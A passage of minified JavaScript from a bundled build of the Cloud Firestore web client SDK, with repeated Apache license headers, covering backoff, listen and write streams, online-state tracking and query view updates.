 */function to(e){return new na(e,!0)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class no{constructor(e,t,n=1e3,r=1.5,i=6e4){this.Ws=e,this.timerId=t,this._o=n,this.mo=r,this.yo=i,this.po=0,this.Io=null,this.To=Date.now(),this.reset()}reset(){this.po=0}Eo(){this.po=this.yo}Ao(e){this.cancel();let t=Math.floor(this.po+this.Ro()),n=Math.max(0,Date.now()-this.To),r=Math.max(0,t-n);r>0&&sr("ExponentialBackoff",`Backing off for ${r} ms (base delay: ${this.po} ms, delay with jitter: ${t} ms, last attempt: ${n} ms ago)`),this.Io=this.Ws.enqueueAfterDelay(this.timerId,r,(()=>(this.To=Date.now(),e()))),this.po*=this.mo,this.po<this._o&&(this.po=this._o),this.po>this.yo&&(this.po=this.yo)}vo(){null!==this.Io&&(this.Io.skipDelay(),this.Io=null)}cancel(){null!==this.Io&&(this.Io.cancel(),this.Io=null)}Ro(){return(Math.random()-.5)*this.po}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ro{constructor(e,t,n,r,i,s,a,o){this.Ws=e,this.bo=n,this.Po=r,this.connection=i,this.authCredentialsProvider=s,this.appCheckCredentialsProvider=a,this.listener=o,this.state=0,this.Vo=0,this.So=null,this.Do=null,this.stream=null,this.Co=new no(e,t)}xo(){return 1===this.state||5===this.state||this.No()}No(){return 2===this.state||3===this.state}start(){4!==this.state?this.auth():this.ko()}async stop(){this.xo()&&await this.close(0)}Oo(){this.state=0,this.Co.reset()}$o(){this.No()&&null===this.So&&(this.So=this.Ws.enqueueAfterDelay(this.bo,6e4,(()=>this.Mo())))}Fo(e){this.Bo(),this.stream.send(e)}async Mo(){if(this.No())return this.close(0)}Bo(){this.So&&(this.So.cancel(),this.So=null)}Lo(){this.Do&&(this.Do.cancel(),this.Do=null)}async close(e,t){this.Bo(),this.Lo(),this.Co.cancel(),this.Vo++,4!==e?this.Co.reset():t&&t.code===cr.RESOURCE_EXHAUSTED?(ar(t.toString()),ar("Using maximum backoff delay to prevent overloading the backend."),this.Co.Eo()):t&&t.code===cr.UNAUTHENTICATED&&3!==this.state&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),null!==this.stream&&(this.qo(),this.stream.close(),this.stream=null),this.state=e,await this.listener.Zr(t)}qo(){}auth(){this.state=1;let e=this.Uo(this.Vo),t=this.Vo;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then((([e,n])=>{this.Vo===t&&this.Ko(e,n)}),(t=>{e((()=>{let e=new hr(cr.UNKNOWN,"Fetching auth token failed: "+t.message);return this.Go(e)}))}))}Ko(e,t){let n=this.Uo(this.Vo);this.stream=this.Qo(e,t),this.stream.Jr((()=>{n((()=>(this.state=2,this.Do=this.Ws.enqueueAfterDelay(this.Po,1e4,(()=>(this.No()&&(this.state=3),Promise.resolve()))),this.listener.Jr())))})),this.stream.Zr((e=>{n((()=>this.Go(e)))})),this.stream.onMessage((e=>{n((()=>this.onMessage(e)))}))}ko(){this.state=5,this.Co.Ao((async()=>{this.state=0,this.start()}))}Go(e){return sr("PersistentStream",`close with error: ${e}`),this.stream=null,this.close(4,e)}Uo(e){return t=>{this.Ws.enqueueAndForget((()=>this.Vo===e?t():(sr("PersistentStream","stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve())))}}}class io extends ro{constructor(e,t,n,r,i,s){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,n,r,s),this.serializer=i}Qo(e,t){return this.connection.wo("Listen",e,t)}onMessage(e){this.Co.reset();let t=function(e,t){let n;if("targetChange"in t){var r,i;t.targetChange;let s="NO_CHANGE"===(r=t.targetChange.targetChangeType||"NO_CHANGE")?0:"ADD"===r?1:"REMOVE"===r?2:"CURRENT"===r?3:"RESET"===r?4:ur(),a=t.targetChange.targetIds||[],o=(i=t.targetChange.resumeToken,e.useProto3Json?(void 0===i||"string"==typeof i||ur(),Hr.fromBase64String(i||"")):(void 0===i||i instanceof Uint8Array||ur(),Hr.fromUint8Array(i||new Uint8Array))),l=t.targetChange.cause,u=l&&function(e){let t=void 0===e.code?cr.UNKNOWN:Bs(e.code);return new hr(t,e.message||"")}(l);n=new Ws(s,a,o,u||null)}else if("documentChange"in t){t.documentChange;let r=t.documentChange;r.document,r.document.name,r.document.updateTime;let i=ua(e,r.document.name),s=sa(r.document.updateTime),a=r.document.createTime?sa(r.document.createTime):Sr.min(),o=new yi({mapValue:{fields:r.document.fields}}),l=vi.newFoundDocument(i,s,a,o),u=r.targetIds||[],c=r.removedTargetIds||[];n=new Ks(u,c,l.key,l)}else if("documentDelete"in t){t.documentDelete;let r=t.documentDelete;r.document;let i=ua(e,r.document),s=r.readTime?sa(r.readTime):Sr.min(),a=vi.newNoDocument(i,s),o=r.removedTargetIds||[];n=new Ks([],o,a.key,a)}else if("documentRemove"in t){t.documentRemove;let r=t.documentRemove;r.document;let i=ua(e,r.document),s=r.removedTargetIds||[];n=new Ks([],s,i,null)}else{if(!("filter"in t))return ur();{t.filter;let e=t.filter;e.targetId;let r=e.count||0,i=new js(r),s=e.targetId;n=new Hs(s,i)}}return n}(this.serializer,e),n=function(e){if(!("targetChange"in e))return Sr.min();let t=e.targetChange;return t.targetIds&&t.targetIds.length?Sr.min():t.readTime?sa(t.readTime):Sr.min()}(e);return this.listener.zo(t,n)}jo(e){let t={};t.database=ha(this.serializer),t.addTarget=function(e,t){let n,r=t.target;return(n=ji(r)?{documents:{documents:[ca(e,r.path)]}}:{query:function(e,t){var n,r,i;let s={structuredQuery:{}},a=t.path;null!==t.collectionGroup?(s.parent=ca(e,a),s.structuredQuery.from=[{collectionId:t.collectionGroup,allDescendants:!0}]):(s.parent=ca(e,a.popLast()),s.structuredQuery.from=[{collectionId:a.lastSegment()}]);let o=function(e){if(0!==e.length)return function e(t){return t instanceof Ti?function(e){if("=="===e.op){if(fi(e.value))return{unaryFilter:{field:pa(e.field),op:"IS_NAN"}};if(di(e.value))return{unaryFilter:{field:pa(e.field),op:"IS_NULL"}}}else if("!="===e.op){if(fi(e.value))return{unaryFilter:{field:pa(e.field),op:"IS_NOT_NAN"}};if(di(e.value))return{unaryFilter:{field:pa(e.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:pa(e.field),op:ea[e.op],value:e.value}}}(t):t instanceof Si?function(t){let n=t.getFilters().map((t=>e(t)));return 1===n.length?n[0]:{compositeFilter:{op:ta[t.op],filters:n}}}(t):ur()}(Si.create(e,"and"))}(t.filters);o&&(s.structuredQuery.where=o);let l=function(e){if(0!==e.length)return e.map((e=>({field:pa(e.field),direction:Zs[e.dir]})))}(t.orderBy);l&&(s.structuredQuery.orderBy=l);let u=(r=t.limit,e.useProto3Json||null==r?r:{value:r});return null!==u&&(s.structuredQuery.limit=u),t.startAt&&(s.structuredQuery.startAt={before:(n=t.startAt).inclusive,values:n.position}),t.endAt&&(s.structuredQuery.endAt={before:!(i=t.endAt).inclusive,values:i.position}),s}(e,r)}).targetId=t.targetId,t.resumeToken.approximateByteSize()>0?n.resumeToken=ia(e,t.resumeToken):t.snapshotVersion.compareTo(Sr.min())>0&&(n.readTime=ra(e,t.snapshotVersion.toTimestamp())),n}(this.serializer,e);let n=function(e,t){let n=function(e,t){switch(t){case 0:return null;case 1:return"existence-filter-mismatch";case 2:return"limbo-document";default:return ur()}}(0,t.purpose);return null==n?null:{"goog-listen-tags":n}}(this.serializer,e);n&&(t.labels=n),this.Fo(t)}Wo(e){let t={};t.database=ha(this.serializer),t.removeTarget=e,this.Fo(t)}}class so extends ro{constructor(e,t,n,r,i,s){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,n,r,s),this.serializer=i,this.Ho=!1}get Jo(){return this.Ho}start(){this.Ho=!1,this.lastStreamToken=void 0,super.start()}qo(){this.Ho&&this.Yo([])}Qo(e,t){return this.connection.wo("Write",e,t)}onMessage(e){var t,n;if(e.streamToken||ur(),this.lastStreamToken=e.streamToken,this.Ho){this.Co.reset();let r=(t=e.writeResults,n=e.commitTime,t&&t.length>0?(void 0!==n||ur(),t.map((e=>{let t;return(t=e.updateTime?sa(e.updateTime):sa(n)).isEqual(Sr.min())&&(t=sa(n)),new Es(t,e.transformResults||[])}))):[]),i=sa(e.commitTime);return this.listener.Zo(i,r)}return e.writeResults&&0!==e.writeResults.length&&ur(),this.Ho=!0,this.listener.Xo()}tu(){let e={};e.database=ha(this.serializer),this.Fo(e)}Yo(e){let t={streamToken:this.lastStreamToken,writes:e.map((e=>function(e,t){var n;let r;if(t instanceof Os)r={update:fa(e,t.key,t.value)};else if(t instanceof Ls)r={delete:la(e,t.key)};else if(t instanceof Ds)r={update:fa(e,t.key,t.data),updateMask:function(e){let t=[];return e.fields.forEach((e=>t.push(e.canonicalString()))),{fieldPaths:t}}(t.fieldMask)};else{if(!(t instanceof Ms))return ur();r={verify:la(e,t.key)}}return t.fieldTransforms.length>0&&(r.updateTransforms=t.fieldTransforms.map((e=>function(e,t){let n=t.transform;if(n instanceof ms)return{fieldPath:t.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(n instanceof gs)return{fieldPath:t.field.canonicalString(),appendMissingElements:{values:n.elements}};if(n instanceof vs)return{fieldPath:t.field.canonicalString(),removeAllFromArray:{values:n.elements}};if(n instanceof bs)return{fieldPath:t.field.canonicalString(),increment:n._t};throw ur()}(0,e)))),t.precondition.isNone||(r.currentDocument=void 0!==(n=t.precondition).updateTime?{updateTime:ra(e,n.updateTime.toTimestamp())}:void 0!==n.exists?{exists:n.exists}:ur()),r}(this.serializer,e)))};this.Fo(t)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ao extends class{}{constructor(e,t,n,r){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=n,this.serializer=r,this.eu=!1}nu(){if(this.eu)throw new hr(cr.FAILED_PRECONDITION,"The client has already been terminated.")}co(e,t,n){return this.nu(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([r,i])=>this.connection.co(e,t,n,r,i))).catch((e=>{throw"FirebaseError"===e.name?(e.code===cr.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),e):new hr(cr.UNKNOWN,e.toString())}))}fo(e,t,n,r){return this.nu(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([i,s])=>this.connection.fo(e,t,n,i,s,r))).catch((e=>{throw"FirebaseError"===e.name?(e.code===cr.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),e):new hr(cr.UNKNOWN,e.toString())}))}terminate(){this.eu=!0}}class oo{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.su=0,this.iu=null,this.ru=!0}ou(){0===this.su&&(this.uu("Unknown"),this.iu=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,(()=>(this.iu=null,this.cu("Backend didn't respond within 10 seconds."),this.uu("Offline"),Promise.resolve()))))}au(e){"Online"===this.state?this.uu("Unknown"):(this.su++,this.su>=1&&(this.hu(),this.cu(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.uu("Offline")))}set(e){this.hu(),this.su=0,"Online"===e&&(this.ru=!1),this.uu(e)}uu(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}cu(e){let t=`Could not reach Cloud Firestore backend. ${e}\nThis typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.ru?(ar(t),this.ru=!1):sr("OnlineStateTracker",t)}hu(){null!==this.iu&&(this.iu.cancel(),this.iu=null)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lo{constructor(e,t,n,r,i){this.localStore=e,this.datastore=t,this.asyncQueue=n,this.remoteSyncer={},this.lu=[],this.fu=new Map,this.du=new Set,this.wu=[],this._u=i,this._u.qr((e=>{n.enqueueAndForget((async()=>{vo(this)&&(sr("RemoteStore","Restarting streams for network reachability change."),await async function(e){e.du.add(4),await co(e),e.mu.set("Unknown"),e.du.delete(4),await uo(e)}(this))}))})),this.mu=new oo(n,r)}}async function uo(e){if(vo(e))for(let t of e.wu)await t(!0)}async function co(e){for(let t of e.wu)await t(!1)}function ho(e,t){e.fu.has(t.targetId)||(e.fu.set(t.targetId,t),yo(e)?go(e):Ro(e).No()&&po(e,t))}function fo(e,t){let n=Ro(e);e.fu.delete(t),n.No()&&mo(e,t),0===e.fu.size&&(n.No()?n.$o():vo(e)&&e.mu.set("Unknown"))}function po(e,t){e.gu.Ot(t.targetId),Ro(e).jo(t)}function mo(e,t){e.gu.Ot(t),Ro(e).Wo(t)}function go(e){e.gu=new Js({getRemoteKeysForTarget:t=>e.remoteSyncer.getRemoteKeysForTarget(t),ne:t=>e.fu.get(t)||null}),Ro(e).start(),e.mu.ou()}function yo(e){return vo(e)&&!Ro(e).xo()&&e.fu.size>0}function vo(e){return 0===e.du.size}async function wo(e){e.fu.forEach(((t,n)=>{po(e,t)}))}async function bo(e,t){e.gu=void 0,yo(e)?(e.mu.au(t),go(e)):e.mu.set("Unknown")}async function _o(e,t,n){if(e.mu.set("Online"),t instanceof Ws&&2===t.state&&t.cause)try{await async function(e,t){let n=t.cause;for(let r of t.targetIds)e.fu.has(r)&&(await e.remoteSyncer.rejectListen(r,n),e.fu.delete(r),e.gu.removeTarget(r))}(e,t)}catch(n){sr("RemoteStore","Failed to remove targets %s: %s ",t.targetIds.join(","),n),await Io(e,n)}else if(t instanceof Ks?e.gu.Kt(t):t instanceof Hs?e.gu.Jt(t):e.gu.zt(t),!n.isEqual(Sr.min()))try{let t=await Ba(e.localStore);n.compareTo(t)>=0&&await function(e,t){let n=e.gu.Xt(t);return n.targetChanges.forEach(((n,r)=>{if(n.resumeToken.approximateByteSize()>0){let i=e.fu.get(r);i&&e.fu.set(r,i.withResumeToken(n.resumeToken,t))}})),n.targetMismatches.forEach((t=>{let n=e.fu.get(t);if(!n)return;e.fu.set(t,n.withResumeToken(Hr.EMPTY_BYTE_STRING,n.snapshotVersion)),mo(e,t);let r=new ya(n.target,t,1,n.sequenceNumber);po(e,r)})),e.remoteSyncer.applyRemoteEvent(n)}(e,n)}catch(t){sr("RemoteStore","Failed to raise snapshot:",t),await Io(e,t)}}async function Io(e,t,n){if(!Pr(t))throw t;e.du.add(1),await co(e),e.mu.set("Offline"),n||(n=()=>Ba(e.localStore)),e.asyncQueue.enqueueRetryable((async()=>{sr("RemoteStore","Retrying IndexedDB access"),await n(),e.du.delete(1),await uo(e)}))}function Eo(e,t){return t().catch((n=>Io(e,n,t)))}async function To(e){let t=xo(e),n=e.lu.length>0?e.lu[e.lu.length-1].batchId:-1;for(;vo(e)&&e.lu.length<10;)try{let r=await function(e,t){return e.persistence.runTransaction("Get next mutation batch","readonly",(n=>(void 0===t&&(t=-1),e.mutationQueue.getNextMutationBatchAfterBatchId(n,t))))}(e.localStore,n);if(null===r){0===e.lu.length&&t.$o();break}n=r.batchId,function(e,t){e.lu.push(t);let n=xo(e);n.No()&&n.Jo&&n.Yo(t.mutations)}(e,r)}catch(t){await Io(e,t)}So(e)&&ko(e)}function So(e){return vo(e)&&!xo(e).xo()&&e.lu.length>0}function ko(e){xo(e).start()}async function Ao(e){xo(e).tu()}async function Co(e){let t=xo(e);for(let n of e.lu)t.Yo(n.mutations)}async function No(e,t,n){let r=e.lu.shift(),i=Us.from(r,t,n);await Eo(e,(()=>e.remoteSyncer.applySuccessfulWrite(i))),await To(e)}async function Oo(e,t){t&&xo(e).Jo&&await async function(e,t){var n;if(function(e){switch(e){default:return ur();case cr.CANCELLED:case cr.UNKNOWN:case cr.DEADLINE_EXCEEDED:case cr.RESOURCE_EXHAUSTED:case cr.INTERNAL:case cr.UNAVAILABLE:case cr.UNAUTHENTICATED:return!1;case cr.INVALID_ARGUMENT:case cr.NOT_FOUND:case cr.ALREADY_EXISTS:case cr.PERMISSION_DENIED:case cr.FAILED_PRECONDITION:case cr.ABORTED:case cr.OUT_OF_RANGE:case cr.UNIMPLEMENTED:case cr.DATA_LOSS:return!0}}(n=t.code)&&n!==cr.ABORTED){let n=e.lu.shift();xo(e).Oo(),await Eo(e,(()=>e.remoteSyncer.rejectFailedWrite(n.batchId,t))),await To(e)}}(e,t),So(e)&&ko(e)}async function Do(e,t){e.asyncQueue.verifyOperationInProgress(),sr("RemoteStore","RemoteStore received new credentials");let n=vo(e);e.du.add(3),await co(e),n&&e.mu.set("Unknown"),await e.remoteSyncer.handleCredentialChange(t),e.du.delete(3),await uo(e)}function Ro(e){var t,n,r;return e.yu||(e.yu=(t=e.datastore,n=e.asyncQueue,r={Jr:wo.bind(null,e),Zr:bo.bind(null,e),zo:_o.bind(null,e)},t.nu(),new io(n,t.connection,t.authCredentials,t.appCheckCredentials,t.serializer,r)),e.wu.push((async t=>{t?(e.yu.Oo(),yo(e)?go(e):e.mu.set("Unknown")):(await e.yu.stop(),e.gu=void 0)}))),e.yu}function xo(e){var t,n,r;return e.pu||(e.pu=(t=e.datastore,n=e.asyncQueue,r={Jr:Ao.bind(null,e),Zr:Oo.bind(null,e),Xo:Co.bind(null,e),Zo:No.bind(null,e)},t.nu(),new so(n,t.connection,t.authCredentials,t.appCheckCredentials,t.serializer,r)),e.wu.push((async t=>{t?(e.pu.Oo(),await To(e)):(await e.pu.stop(),e.lu.length>0&&(sr("RemoteStore",`Stopping write stream with ${e.lu.length} pending writes`),e.lu=[]))}))),e.pu}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Po{constructor(e,t,n,r,i){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=n,this.op=r,this.removalCallback=i,this.deferred=new dr,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch((e=>{}))}static createAndSchedule(e,t,n,r,i){let s=Date.now()+n,a=new Po(e,t,s,r,i);return a.start(n),a}start(e){this.timerHandle=setTimeout((()=>this.handleDelayElapsed()),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){null!==this.timerHandle&&(this.clearTimeout(),this.deferred.reject(new hr(cr.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget((()=>null!==this.timerHandle?(this.clearTimeout(),this.op().then((e=>this.deferred.resolve(e)))):Promise.resolve()))}clearTimeout(){null!==this.timerHandle&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function Lo(e,t){if(ar("AsyncQueue",`${t}: ${e}`),Pr(e))return new hr(cr.UNAVAILABLE,`${t}: ${e}`);throw e}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Mo{constructor(e){this.comparator=e?(t,n)=>e(t,n)||Or.comparator(t.key,n.key):(e,t)=>Or.comparator(e.key,t.key),this.keyedMap=is(),this.sortedSet=new jr(this.comparator)}static emptySet(e){return new Mo(e.comparator)}has(e){return null!=this.keyedMap.get(e)}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){let t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal(((t,n)=>(e(t),!1)))}add(e){let t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){let t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof Mo)||this.size!==e.size)return!1;let t=this.sortedSet.getIterator(),n=e.sortedSet.getIterator();for(;t.hasNext();){let e=t.getNext().key,r=n.getNext().key;if(!e.isEqual(r))return!1}return!0}toString(){let e=[];return this.forEach((t=>{e.push(t.toString())})),0===e.length?"DocumentSet ()":"DocumentSet (\n  "+e.join("  \n")+"\n)"}copy(e,t){let n=new Mo;return n.comparator=this.comparator,n.keyedMap=e,n.sortedSet=t,n
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Fo{constructor(){this.Iu=new jr(Or.comparator)}track(e){let t=e.doc.key,n=this.Iu.get(t);n?0!==e.type&&3===n.type?this.Iu=this.Iu.insert(t,e):3===e.type&&1!==n.type?this.Iu=this.Iu.insert(t,{type:n.type,doc:e.doc}):2===e.type&&2===n.type?this.Iu=this.Iu.insert(t,{type:2,doc:e.doc}):2===e.type&&0===n.type?this.Iu=this.Iu.insert(t,{type:0,doc:e.doc}):1===e.type&&0===n.type?this.Iu=this.Iu.remove(t):1===e.type&&2===n.type?this.Iu=this.Iu.insert(t,{type:1,doc:n.doc}):0===e.type&&1===n.type?this.Iu=this.Iu.insert(t,{type:2,doc:e.doc}):ur():this.Iu=this.Iu.insert(t,e)}Tu(){let e=[];return this.Iu.inorderTraversal(((t,n)=>{e.push(n)})),e}}class Uo{constructor(e,t,n,r,i,s,a,o,l){this.query=e,this.docs=t,this.oldDocs=n,this.docChanges=r,this.mutatedKeys=i,this.fromCache=s,this.syncStateChanged=a,this.excludesMetadataChanges=o,this.hasCachedResults=l}static fromInitialDocuments(e,t,n,r,i){let s=[];return t.forEach((e=>{s.push({type:0,doc:e})})),new Uo(e,t,Mo.emptySet(t),s,n,r,!0,!1,i)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&Ji(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;let t=this.docChanges,n=e.docChanges;if(t.length!==n.length)return!1;for(let e=0;e<t.length;e++)if(t[e].type!==n[e].type||!t[e].doc.isEqual(n[e].doc))return!1;return!0}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vo{constructor(){this.Eu=void 0,this.listeners=[]}}class jo{constructor(){this.queries=new ts((e=>Xi(e)),Ji),this.onlineState="Unknown",this.Au=new Set}}async function Bo(e,t){let n=t.query,r=!1,i=e.queries.get(n);if(i||(r=!0,i=new Vo),r)try{i.Eu=await e.onListen(n)}catch(n){let e=Lo(n,`Initialization of query '${Yi(t.query)}' failed`);return void t.onError(e)}e.queries.set(n,i),i.listeners.push(t),t.Ru(e.onlineState),i.Eu&&t.vu(i.Eu)&&Go(e)}async function qo(e,t){let n=t.query,r=!1,i=e.queries.get(n);if(i){let e=i.listeners.indexOf(t);e>=0&&(i.listeners.splice(e,1),r=0===i.listeners.length)}if(r)return e.queries.delete(n),e.onUnlisten(n)}function $o(e,t){let n=!1;for(let r of t){let t=r.query,i=e.queries.get(t);if(i){for(let e of i.listeners)e.vu(r)&&(n=!0);i.Eu=r}}n&&Go(e)}function zo(e,t,n){let r=e.queries.get(t);if(r)for(let e of r.listeners)e.onError(n);e.queries.delete(t)}function Go(e){e.Au.forEach((e=>{e.next()}))}class Ko{constructor(e,t,n){this.query=e,this.bu=t,this.Pu=!1,this.Vu=null,this.onlineState="Unknown",this.options=n||{}}vu(e){if(!this.options.includeMetadataChanges){let t=[];for(let n of e.docChanges)3!==n.type&&t.push(n);e=new Uo(e.query,e.docs,e.oldDocs,t,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.Pu?this.Su(e)&&(this.bu.next(e),t=!0):this.Du(e,this.onlineState)&&(this.Cu(e),t=!0),this.Vu=e,t}onError(e){this.bu.error(e)}Ru(e){this.onlineState=e;let t=!1;return this.Vu&&!this.Pu&&this.Du(this.Vu,e)&&(this.Cu(this.Vu),t=!0),t}Du(e,t){return!e.fromCache||(!this.options.xu||!("Offline"!==t))&&(!e.docs.isEmpty()||e.hasCachedResults||"Offline"===t)}Su(e){if(e.docChanges.length>0)return!0;let t=this.Vu&&this.Vu.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&!0===this.options.includeMetadataChanges}Cu(e){e=Uo.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.Pu=!0,this.bu.next(e)
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Ho{constructor(e){this.key=e}}class Wo{constructor(e){this.key=e}}class Qo{constructor(e,t){this.query=e,this.Lu=t,this.qu=null,this.hasCachedResults=!1,this.current=!1,this.Uu=us(),this.mutatedKeys=us(),this.Ku=es(e),this.Gu=new Mo(this.Ku)}get Qu(){return this.Lu}zu(e,t){let n=t?t.ju:new Fo,r=t?t.Gu:this.Gu,i=t?t.mutatedKeys:this.mutatedKeys,s=r,a=!1,o="F"===this.query.limitType&&r.size===this.query.limit?r.last():null,l="L"===this.query.limitType&&r.size===this.query.limit?r.first():null;if(e.inorderTraversal(((e,t)=>{let u=r.get(e),c=Zi(this.query,t)?t:null,h=!!u&&this.mutatedKeys.has(u.key),d=!!c&&(c.hasLocalMutations||this.mutatedKeys.has(c.key)&&c.hasCommittedMutations),f=!1;u&&c?u.data.isEqual(c.data)?h!==d&&(n.track({type:3,doc:c}),f=!0):this.Wu(u,c)||(n.track({type:2,doc:c}),f=!0,(o&&this.Ku(c,o)>0||l&&0>this.Ku(c,l))&&(a=!0)):!u&&c?(n.track({type:0,doc:c}),f=!0):u&&!c&&(n.track({type:1,doc:u}),f=!0,(o||l)&&(a=!0)),f&&(c?(s=s.add(c),i=d?i.add(e):i.delete(e)):(s=s.delete(e),i=i.delete(e)))})),null!==this.query.limit)for(;s.size>this.query.limit;){let e="F"===this.query.limitType?s.last():s.first();s=s.delete(e.key),i=i.delete(e.key),n.track({type:1,doc:e})}return{Gu:s,ju:n,Mi:a,mutatedKeys:i}}Wu(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,n){let r=this.Gu;this.Gu=e.Gu,this.mutatedKeys=e.mutatedKeys;let i=e.ju.Tu();i.sort(((e,t)=>function(e,t){let n=e=>{switch(e){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return ur()}};return 